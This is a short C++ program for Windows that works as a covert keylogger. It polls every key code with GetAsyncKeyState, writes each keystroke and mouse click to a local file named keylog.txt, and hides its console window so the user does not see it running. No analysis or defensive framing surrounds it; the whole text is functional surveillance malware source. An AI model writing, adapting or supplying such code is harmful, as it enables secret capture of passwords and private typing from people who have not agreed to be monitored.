#include <iostream>
#include <windows.h>
#include <fstream>
#include <thread>
#include <chrono>

void startLogger() {
    while (true) {
        for (int c = 0; c <= 254; c++) {
            if (GetAsyncKeyState(c) & 0x1) { 
                std::ofstream log("keylog.txt", std::ios::app);
                if (!log.is_open()) {
                    std::cerr << "Error opening log file!" << std::endl;
                    return;
                }

                switch (c) {
                    case VK_BACK: log << "[Backspace]"; break;
                    case VK_RETURN: log << "[Enter]\n"; break;
                    case VK_SHIFT: log << "[Shift]"; break;
                    case VK_CONTROL: log << "[Ctrl]"; break;
                    case VK_TAB: log << "[Tab]"; break;
                    case VK_MENU: log << "[Alt]"; break;
                    case VK_LBUTTON: log << "[Left Click]"; break;
                    case VK_RBUTTON: log << "[Right Click]"; break;
                    default:
                        log << static_cast<char>(c); 
                }
                log.flush(); 
            }
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(10)); 
    }
}

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE); // Скрываем консольное окно
    startLogger();
    return 0;
}
